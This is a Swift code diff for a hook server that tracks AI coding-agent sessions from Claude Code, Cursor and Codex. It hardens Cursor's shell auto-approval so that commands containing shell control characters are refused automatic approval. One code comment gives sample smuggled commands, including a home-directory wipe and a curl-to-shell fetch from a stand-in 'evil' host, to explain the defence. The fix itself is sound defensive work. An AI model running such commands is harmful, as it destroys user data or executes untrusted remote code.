@@ -4,6 +4,7 @@ import NIOCore
 
 private struct HookEventBody: Decodable, Sendable {
     var session_id: String?
+    var conversation_id: String?
     var hook_event_name: String?
     var hookEventName: String?
     var cwd: String?
@@ -84,6 +85,12 @@ func buildHookServer(engine: BuddyEngine, config: BuddyConfig) -> Application<Ro
         let source = body.agent_id ?? "claude-code"
         let sessionId = body.session_id ?? body.conversation_id ?? "\(source)_default"
         await diagLog.log(category: "signal", source: source, event: body.signal ?? "unknown", detail: "session=\(sessionId)", rawPayload: rawJSON)
+        // A session-end signal deregisters the session outright — agents (e.g. Cursor)
+        // route lifecycle close events here, and there is no process watcher to reap them.
+        if body.signal == "session_end" {
+            await engine.sessionEnded(sessionId: sessionId)
+            return emptyOK()
+        }
         await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd)
         if let signalStr = body.signal, let signal = ActivitySignalKind(rawValue: signalStr) {
             await engine.activitySignal(sessionId: sessionId, source: source, signal: signal)
@@ -156,6 +163,11 @@ private func handleAgentEvent(body: HookEventBody, source: String, hookPid: Int3
 
     case "PostToolUse":
         await engine.clearRequest(sessionId: sessionId)
+        await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking)
+
+    case "PreToolUse":
+        // Codex fires PreToolUse before running a tool. Keep the pet busy while the
+        // tool runs (Codex has no separate "still working" signal between turns).
         await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking)
 
     case "SessionEnd":
@@ -236,9 +248,16 @@ private let cursorSafeShellPatterns: [String] = [
     #"^git (status|log|diff|show|branch|remote|tag)\b"#,
 ]
 
-private func shouldAutoApprove(tool: String, hint: String, source: String) -> ApprovalDecision? {
+// Shell control operators that let a "safe" command prefix smuggle a second,
+// dangerous command (e.g. `ls; rm -rf ~`, `cat x && curl evil | sh`, `git log > f`).
+// If any appear, the command is NOT eligible for auto-approval — it must be
+// reviewed manually.
+private let shellControlCharacters = CharacterSet(charactersIn: ";&|`$()<>\n\r")
+
+func shouldAutoApprove(tool: String, hint: String, source: String) -> ApprovalDecision? {
     guard source == "cursor" else { return nil }
     if cursorAutoApproveTools.contains(tool) { return .allow }
+    if hint.rangeOfCharacter(from: shellControlCharacters) != nil { return nil }
     for pattern in cursorSafeShellPatterns {
         if hint.range(of: pattern, options: .regularExpression) != nil {
             return .allow
@@ -271,7 +290,7 @@ private func hashCwd(_ cwd: String?) -> String {
 }
 
 private func deriveSessionId(from body: HookEventBody, source: String) -> String {
-    body.session_id ?? "\(source)_\(hashCwd(body.cwd))"
+    body.session_id ?? body.conversation_id ?? "\(source)_\(hashCwd(body.cwd))"
 }
 
 private func shortUUID() -> String {
